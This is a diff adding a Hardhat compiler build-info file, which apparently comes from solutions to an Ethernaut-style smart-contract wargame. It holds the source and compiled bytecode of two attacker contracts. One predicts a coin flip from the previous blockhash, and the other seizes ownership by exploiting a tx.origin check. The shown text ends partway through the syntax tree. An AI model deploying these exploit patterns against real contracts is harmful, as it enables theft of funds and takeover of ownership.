@@ -1,0 +1,1662 @@
+{
+  "id": "05b651311b35b15587c436dc82a61774",
+  "_format": "hh-sol-build-info-1",
+  "solcVersion": "0.7.3",
+  "solcLongVersion": "0.7.3+commit.9bfce1f6",
+  "input": {
+    "language": "Solidity",
+    "sources": {
+      "contracts/3-CoinFlipAttacker.sol": {
+        "content": "pragma solidity ^0.7.3;\n\ninterface ICoinFlipChallenge {\n    function flip(bool _guess) external returns (bool);\n}\n\ncontract CoinFlipAttacker {\n    uint256 FACTOR =\n        57896044618658097711785492504343953926634992332820282019728792003956564819968;\n    uint256 lastHash;\n    address CoinFlip;\n\n    constructor(address _CoinFlip) {\n        CoinFlip = _CoinFlip;\n    }\n\n    function attack() public {\n        // 攻击手段为blockNumber是可以预测的\n        uint256 blockValue = uint256(blockhash(block.number - 1));\n        if (lastHash == blockValue) {\n            revert();\n        }\n\n        lastHash = blockValue;\n        uint256 coinFlip = blockValue / FACTOR;\n        bool side = coinFlip == 1 ? true : false;\n        ICoinFlipChallenge(CoinFlip).flip(side);\n    }\n}\n"
+      },
+      "contracts/4-TelephoneAttacker.sol": {
+        "content": "pragma solidity ^0.7.3;\n\ninterface ITelephone {\n    function changeOwner(address _owner) external;\n}\n\ncontract TelephoneAttacker {\n    address telephone;\n\n    constructor(address _telephone) {\n        telephone = _telephone;\n    }\n\n    function attack() public {\n        ITelephone(telephone).changeOwner(address(this));\n    }\n}\n"
+      }
+    },
+    "settings": {
+      "optimizer": {
+        "enabled": false,
+        "runs": 200
+      },
+      "outputSelection": {
+        "*": {
+          "*": [
+            "abi",
+            "evm.bytecode",
+            "evm.deployedBytecode",
+            "evm.methodIdentifiers"
+          ],
+          "": [
+            "ast"
+          ]
+        }
+      }
+    }
+  },
+  "output": {
+    "contracts": {
+      "contracts/3-CoinFlipAttacker.sol": {
+        "CoinFlipAttacker": {
+          "abi": [
+            {
+              "inputs": [
+                {
+                  "internalType": "address",
+                  "name": "_CoinFlip",
+                  "type": "address"
+                }
+              ],
+              "stateMutability": "nonpayable",
+              "type": "constructor"
+            },
+            {
+              "inputs": [],
+              "name": "attack",
+              "outputs": [],
+              "stateMutability": "nonpayable",
+              "type": "function"
+            }
+          ],
+          "evm": {
+            "bytecode": {
+              "generatedSources": [],
+              "linkReferences": {},
+              "object": "60806040527f800000000000000000000000000000000000000000000000000000000000000060005534801561003457600080fd5b506040516102283803806102288339818101604052602081101561005757600080fd5b810190808051906020019092919050505080600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505061016f806100b96000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c80639e5faafc14610030575b600080fd5b61003861003a565b005b6000600143034060001c905080600154141561005557600080fd5b8060018190555060008054828161006857fe5b04905060006001821461007c57600061007f565b60015b9050600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631d263f67826040518263ffffffff1660e01b8152600401808215158152602001915050602060405180830381600087803b1580156100f857600080fd5b505af115801561010c573d6000803e3d6000fd5b505050506040513d602081101561012257600080fd5b81019080805190602001909291905050505050505056fea2646970667358221220d33fca80943236edb02093090f6717c4fbcbc776e4d4a080fac157155187bb9664736f6c63430007030033",
+              "opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH32 0x8000000000000000000000000000000000000000000000000000000000000000 PUSH1 0x0 SSTORE CALLVALUE DUP1 ISZERO PUSH2 0x34 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x228 CODESIZE SUB DUP1 PUSH2 0x228 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x57 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP DUP1 PUSH1 0x2 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x16F DUP1 PUSH2 0xB9 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x2B JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x30 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x38 PUSH2 0x3A JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 PUSH1 0x1 NUMBER SUB BLOCKHASH PUSH1 0x0 SHR SWAP1 POP DUP1 PUSH1 0x1 SLOAD EQ ISZERO PUSH2 0x55 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 PUSH1 0x1 DUP2 SWAP1 SSTORE POP PUSH1 0x0 DUP1 SLOAD DUP3 DUP2 PUSH2 0x68 JUMPI INVALID JUMPDEST DIV SWAP1 POP PUSH1 0x0 PUSH1 0x1 DUP3 EQ PUSH2 0x7C JUMPI PUSH1 0x0 PUSH2 0x7F JUMP JUMPDEST PUSH1 0x1 JUMPDEST SWAP1 POP PUSH1 0x2 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x1D263F67 DUP3 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xF8 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x10C JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x122 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP POP POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xD3 EXTCODEHASH 0xCA DUP1 SWAP5 ORIGIN CALLDATASIZE 0xED 0xB0 KECCAK256 SWAP4 MULMOD 0xF PUSH8 0x17C4FBCBC776E4D4 LOG0 DUP1 STATICCALL 0xC1 JUMPI ISZERO MLOAD DUP8 0xBB SWAP7 PUSH5 0x736F6C6343 STOP SMOD SUB STOP CALLER ",
+              "sourceMap": "115:665:0:-:0;;;172:77;147:102;;300:68;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;352:9;341:8;;:20;;;;;;;;;;;;;;;;;;300:68;115:665;;;;;;"
+            },
+            "deployedBytecode": {
+              "generatedSources": [],
+              "immutableReferences": {},
+              "linkReferences": {},
+              "object": "608060405234801561001057600080fd5b506004361061002b5760003560e01c80639e5faafc14610030575b600080fd5b61003861003a565b005b6000600143034060001c905080600154141561005557600080fd5b8060018190555060008054828161006857fe5b04905060006001821461007c57600061007f565b60015b9050600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631d263f67826040518263ffffffff1660e01b8152600401808215158152602001915050602060405180830381600087803b1580156100f857600080fd5b505af115801561010c573d6000803e3d6000fd5b505050506040513d602081101561012257600080fd5b81019080805190602001909291905050505050505056fea2646970667358221220d33fca80943236edb02093090f6717c4fbcbc776e4d4a080fac157155187bb9664736f6c63430007030033",
+              "opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x2B JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x30 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x38 PUSH2 0x3A JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 PUSH1 0x1 NUMBER SUB BLOCKHASH PUSH1 0x0 SHR SWAP1 POP DUP1 PUSH1 0x1 SLOAD EQ ISZERO PUSH2 0x55 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 PUSH1 0x1 DUP2 SWAP1 SSTORE POP PUSH1 0x0 DUP1 SLOAD DUP3 DUP2 PUSH2 0x68 JUMPI INVALID JUMPDEST DIV SWAP1 POP PUSH1 0x0 PUSH1 0x1 DUP3 EQ PUSH2 0x7C JUMPI PUSH1 0x0 PUSH2 0x7F JUMP JUMPDEST PUSH1 0x1 JUMPDEST SWAP1 POP PUSH1 0x2 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x1D263F67 DUP3 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xF8 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x10C JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x122 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP POP POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xD3 EXTCODEHASH 0xCA DUP1 SWAP5 ORIGIN CALLDATASIZE 0xED 0xB0 KECCAK256 SWAP4 MULMOD 0xF PUSH8 0x17C4FBCBC776E4D4 LOG0 DUP1 STATICCALL 0xC1 JUMPI ISZERO MLOAD DUP8 0xBB SWAP7 PUSH5 0x736F6C6343 STOP SMOD SUB STOP CALLER ",
+              "sourceMap": "115:665:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;374:404;;;:::i;:::-;;;465:18;519:1;504:12;:16;494:27;486:36;;465:57;;548:10;536:8;;:22;532:61;;;574:8;;;532:61;614:10;603:8;:21;;;;634:16;666:6;;653:10;:19;;;;;;634:38;;682:9;706:1;694:8;:13;:28;;717:5;694:28;;;710:4;694:28;682:40;;751:8;;;;;;;;;;;732:33;;;766:4;732:39;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;374:404;;;:::o"
+            },
+            "methodIdentifiers": {
+              "attack()": "9e5faafc"
+            }
+          }
+        },
+        "ICoinFlipChallenge": {
+          "abi": [
+            {
+              "inputs": [
+                {
+                  "internalType": "bool",
+                  "name": "_guess",
+                  "type": "bool"
+                }
+              ],
+              "name": "flip",
+              "outputs": [
+                {
+                  "internalType": "bool",
+                  "name": "",
+                  "type": "bool"
+                }
+              ],
+              "stateMutability": "nonpayable",
+              "type": "function"
+            }
+          ],
+          "evm": {
+            "bytecode": {
+              "generatedSources": [],
+              "linkReferences": {},
+              "object": "",
+              "opcodes": "",
+              "sourceMap": ""
+            },
+            "deployedBytecode": {
+              "generatedSources": [],
+              "immutableReferences": {},
+              "linkReferences": {},
+              "object": "",
+              "opcodes": "",
+              "sourceMap": ""
+            },
+            "methodIdentifiers": {
+              "flip(bool)": "1d263f67"
+            }
+          }
+        }
+      },
+      "contracts/4-TelephoneAttacker.sol": {
+        "ITelephone": {
+          "abi": [
+            {
+              "inputs": [
+                {
+                  "internalType": "address",
+                  "name": "_owner",
+                  "type": "address"
+                }
+              ],
+              "name": "changeOwner",
+              "outputs": [],
+              "stateMutability": "nonpayable",
+              "type": "function"
+            }
+          ],
+          "evm": {
+            "bytecode": {
+              "generatedSources": [],
+              "linkReferences": {},
+              "object": "",
+              "opcodes": "",
+              "sourceMap": ""
+            },
+            "deployedBytecode": {
+              "generatedSources": [],
+              "immutableReferences": {},
+              "linkReferences": {},
+              "object": "",
+              "opcodes": "",
+              "sourceMap": ""
+            },
+            "methodIdentifiers": {
+              "changeOwner(address)": "a6f9dae1"
+            }
+          }
+        },
+        "TelephoneAttacker": {
+          "abi": [
+            {
+              "inputs": [
+                {
+                  "internalType": "address",
+                  "name": "_telephone",
+                  "type": "address"
+                }
+              ],
+              "stateMutability": "nonpayable",
+              "type": "constructor"
+            },
+            {
+              "inputs": [],
+              "name": "attack",
+              "outputs": [],
+              "stateMutability": "nonpayable",
+              "type": "function"
+            }
+          ],
+          "evm": {
+            "bytecode": {
+              "generatedSources": [],
+              "linkReferences": {},
+              "object": "608060405234801561001057600080fd5b506040516101a03803806101a08339818101604052602081101561003357600080fd5b8101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505061010c806100946000396000f3fe6080604052348015600f57600080fd5b506004361060285760003560e01c80639e5faafc14602d575b600080fd5b60336035565b005b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a6f9dae1306040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff168152602001915050600060405180830381600087803b15801560bd57600080fd5b505af115801560d0573d6000803e3d6000fd5b5050505056fea26469706673582212200022e370a4eda9d8d05834e2860b22855ca17115946efa5e0dddfd60602cd5be64736f6c63430007030033",
+              "opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x1A0 CODESIZE SUB DUP1 PUSH2 0x1A0 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x33 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x10C DUP1 PUSH2 0x94 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH1 0x28 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x9E5FAAFC EQ PUSH1 0x2D JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x33 PUSH1 0x35 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xA6F9DAE1 ADDRESS PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH1 0xBD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH1 0xD0 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 STOP 0x22 0xE3 PUSH17 0xA4EDA9D8D05834E2860B22855CA1711594 PUSH15 0xFA5E0DDDFD60602CD5BE64736F6C63 NUMBER STOP SMOD SUB STOP CALLER ",
+              "sourceMap": "102:226:1:-:0;;;159:71;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;213:10;201:9;;:22;;;;;;;;;;;;;;;;;;159:71;102:226;;;;;;"
+            },
+            "deployedBytecode": {
+              "generatedSources": [],
+              "immutableReferences": {},
+              "linkReferences": {},
+              "object": "6080604052348015600f57600080fd5b506004361060285760003560e01c80639e5faafc14602d575b600080fd5b60336035565b005b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a6f9dae1306040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff168152602001915050600060405180830381600087803b15801560bd57600080fd5b505af115801560d0573d6000803e3d6000fd5b5050505056fea26469706673582212200022e370a4eda9d8d05834e2860b22855ca17115946efa5e0dddfd60602cd5be64736f6c63430007030033",
+              "opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH1 0x28 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x9E5FAAFC EQ PUSH1 0x2D JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x33 PUSH1 0x35 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xA6F9DAE1 ADDRESS PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH1 0xBD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH1 0xD0 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 STOP 0x22 0xE3 PUSH17 0xA4EDA9D8D05834E2860B22855CA1711594 PUSH15 0xFA5E0DDDFD60602CD5BE64736F6C63 NUMBER STOP SMOD SUB STOP CALLER ",
+              "sourceMap": "102:226:1:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;236:90;;;:::i;:::-;;;282:9;;;;;;;;;;271:33;;;313:4;271:48;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;236:90::o"
+            },
+            "methodIdentifiers": {
+              "attack()": "9e5faafc"
+            }
+          }
+        }
+      }
+    },
+    "errors": [
+      {
+        "component": "general",
+        "errorCode": "1878",
+        "formattedMessage": "contracts/3-CoinFlipAttacker.sol: Warning: SPDX license identifier not provided in source file. Before publishing, consider adding a comment containing \"SPDX-License-Identifier: <SPDX-License>\" to each source file. Use \"SPDX-License-Identifier: UNLICENSED\" for non-open-source code. Please see https://spdx.org for more information.\n",
+        "message": "SPDX license identifier not provided in source file. Before publishing, consider adding a comment containing \"SPDX-License-Identifier: <SPDX-License>\" to each source file. Use \"SPDX-License-Identifier: UNLICENSED\" for non-open-source code. Please see https://spdx.org for more information.",
+        "severity": "warning",
+        "sourceLocation": {
+          "end": -1,
+          "file": "contracts/3-CoinFlipAttacker.sol",
+          "start": -1
+        },
+        "type": "Warning"
+      },
+      {
+        "component": "general",
+        "errorCode": "1878",
+        "formattedMessage": "contracts/4-TelephoneAttacker.sol: Warning: SPDX license identifier not provided in source file. Before publishing, consider adding a comment containing \"SPDX-License-Identifier: <SPDX-License>\" to each source file. Use \"SPDX-License-Identifier: UNLICENSED\" for non-open-source code. Please see https://spdx.org for more information.\n",
+        "message": "SPDX license identifier not provided in source file. Before publishing, consider adding a comment containing \"SPDX-License-Identifier: <SPDX-License>\" to each source file. Use \"SPDX-License-Identifier: UNLICENSED\" for non-open-source code. Please see https://spdx.org for more information.",
+        "severity": "warning",
+        "sourceLocation": {
+          "end": -1,
+          "file": "contracts/4-TelephoneAttacker.sol",
+          "start": -1
+        },
+        "type": "Warning"
+      }
+    ],
+    "sources": {
+      "contracts/3-CoinFlipAttacker.sol": {
+        "ast": {
+          "absolutePath": "contracts/3-CoinFlipAttacker.sol",
+          "exportedSymbols": {
+            "CoinFlipAttacker": [
+              77
+            ],
+            "ICoinFlipChallenge": [
+              9
+            ]
+          },
+          "id": 78,
+          "nodeType": "SourceUnit",
+          "nodes": [
+            {
+              "id": 1,
+              "literals": [
+                "solidity",
+                "^",
+                "0.7",
+                ".3"
+              ],
+              "nodeType": "PragmaDirective",
+              "src": "0:23:0"
+            },
+            {
+              "abstract": false,
+              "baseContracts": [],
+              "contractDependencies": [],
+              "contractKind": "interface",
+              "fullyImplemented": false,
+              "id": 9,
+              "linearizedBaseContracts": [
+                9
+              ],
+              "name": "ICoinFlipChallenge",
+              "nodeType": "ContractDefinition",
+              "nodes": [
+                {
+                  "functionSelector": "1d263f67",
+                  "id": 8,
+                  "implemented": false,
+                  "kind": "function",
+                  "modifiers": [],
+                  "name": "flip",
+                  "nodeType": "FunctionDefinition",
+                  "parameters": {
+                    "id": 4,
+                    "nodeType": "ParameterList",
+                    "parameters": [
+                      {
+                        "constant": false,
+                        "id": 3,
+                        "mutability": "mutable",
+                        "name": "_guess",
+                        "nodeType": "VariableDeclaration",
+                        "scope": 8,
+                        "src": "74:11:0",
+                        "stateVariable": false,
+                        "storageLocation": "default",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_bool",
+                          "typeString": "bool"
+                        },
+                        "typeName": {
+                          "id": 2,
+                          "name": "bool",
+                          "nodeType": "ElementaryTypeName",
+                          "src": "74:4:0",
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_bool",
+                            "typeString": "bool"
+                          }
+                        },
+                        "visibility": "internal"
+                      }
+                    ],
+                    "src": "73:13:0"
+                  },
+                  "returnParameters": {
+                    "id": 7,
+                    "nodeType": "ParameterList",
+                    "parameters": [
+                      {
+                        "constant": false,
+                        "id": 6,
+                        "mutability": "mutable",
+                        "name": "",
+                        "nodeType": "VariableDeclaration",
+                        "scope": 8,
+                        "src": "105:4:0",
+                        "stateVariable": false,
+                        "storageLocation": "default",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_bool",
+                          "typeString": "bool"
+                        },
+                        "typeName": {
+                          "id": 5,
+                          "name": "bool",
+                          "nodeType": "ElementaryTypeName",
+                          "src": "105:4:0",
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_bool",
+                            "typeString": "bool"
+                          }
+                        },
+                        "visibility": "internal"
+                      }
+                    ],
+                    "src": "104:6:0"
+                  },
+                  "scope": 9,
+                  "src": "60:51:0",
+                  "stateMutability": "nonpayable",
+                  "virtual": false,
+                  "visibility": "external"
+                }
+              ],
+              "scope": 78,
+              "src": "25:88:0"
+            },
+            {
+              "abstract": false,
+              "baseContracts": [],
+              "contractDependencies": [],
+              "contractKind": "contract",
+              "fullyImplemented": true,
+              "id": 77,
+              "linearizedBaseContracts": [
+                77
+              ],
+              "name": "CoinFlipAttacker",
+              "nodeType": "ContractDefinition",
+              "nodes": [
+                {
+                  "constant": false,
+                  "id": 12,
+                  "mutability": "mutable",
+                  "name": "FACTOR",
+                  "nodeType": "VariableDeclaration",
+                  "scope": 77,
+                  "src": "147:102:0",
+                  "stateVariable": true,
+                  "storageLocation": "default",
+                  "typeDescriptions": {
+                    "typeIdentifier": "t_uint256",
+                    "typeString": "uint256"
+                  },
+                  "typeName": {
+                    "id": 10,
+                    "name": "uint256",
+                    "nodeType": "ElementaryTypeName",
+                    "src": "147:7:0",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_uint256",
+                      "typeString": "uint256"
+                    }
+                  },
+                  "value": {
+                    "hexValue": "3537383936303434363138363538303937373131373835343932353034333433393533393236363334393932333332383230323832303139373238373932303033393536353634383139393638",
+                    "id": 11,
+                    "isConstant": false,
+                    "isLValue": false,
+                    "isPure": true,
+                    "kind": "number",
+                    "lValueRequested": false,
+                    "nodeType": "Literal",
+                    "src": "172:77:0",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_rational_57896044618658097711785492504343953926634992332820282019728792003956564819968_by_1",
+                      "typeString": "int_const 5789...(69 digits omitted)...9968"
+                    },
+                    "value": "57896044618658097711785492504343953926634992332820282019728792003956564819968"
+                  },
+                  "visibility": "internal"
+                },
+                {
+                  "constant": false,
+                  "id": 14,
+                  "mutability": "mutable",
+                  "name": "lastHash",
+                  "nodeType": "VariableDeclaration",
+                  "scope": 77,
+                  "src": "255:16:0",
+                  "stateVariable": true,
+                  "storageLocation": "default",
+                  "typeDescriptions": {
+                    "typeIdentifier": "t_uint256",
+                    "typeString": "uint256"
+                  },
+                  "typeName": {
+                    "id": 13,
+                    "name": "uint256",
+                    "nodeType": "ElementaryTypeName",
+                    "src": "255:7:0",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_uint256",
+                      "typeString": "uint256"
+                    }
+                  },
+                  "visibility": "internal"
+                },
+                {
+                  "constant": false,
+                  "id": 16,
+                  "mutability": "mutable",
+                  "name": "CoinFlip",
+                  "nodeType": "VariableDeclaration",
+                  "scope": 77,
+                  "src": "277:16:0",
+                  "stateVariable": true,
+                  "storageLocation": "default",
+                  "typeDescriptions": {
+                    "typeIdentifier": "t_address",
+                    "typeString": "address"
+                  },
+                  "typeName": {
+                    "id": 15,
+                    "name": "address",
+                    "nodeType": "ElementaryTypeName",
+                    "src": "277:7:0",
+                    "stateMutability": "nonpayable",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_address",
+                      "typeString": "address"
+                    }
+                  },
+                  "visibility": "internal"
+                },
+                {
+                  "body": {
+                    "id": 25,
+                    "nodeType": "Block",
+                    "src": "331:37:0",
+                    "statements": [
+                      {
+                        "expression": {
+                          "id": 23,
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": false,
+                          "lValueRequested": false,
+                          "leftHandSide": {
+                            "id": 21,
+                            "name": "CoinFlip",
+                            "nodeType": "Identifier",
+                            "overloadedDeclarations": [],
+                            "referencedDeclaration": 16,
+                            "src": "341:8:0",
+                            "typeDescriptions": {
+                              "typeIdentifier": "t_address",
+                              "typeString": "address"
+                            }
+                          },
+                          "nodeType": "Assignment",
+                          "operator": "=",
+                          "rightHandSide": {
+                            "id": 22,
+                            "name": "_CoinFlip",
+                            "nodeType": "Identifier",
+                            "overloadedDeclarations": [],
+                            "referencedDeclaration": 18,
+                            "src": "352:9:0",
+                            "typeDescriptions": {
+                              "typeIdentifier": "t_address",
+                              "typeString": "address"
+                            }
+                          },
+                          "src": "341:20:0",
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_address",
+                            "typeString": "address"
+                          }
+                        },
+                        "id": 24,
+                        "nodeType": "ExpressionStatement",
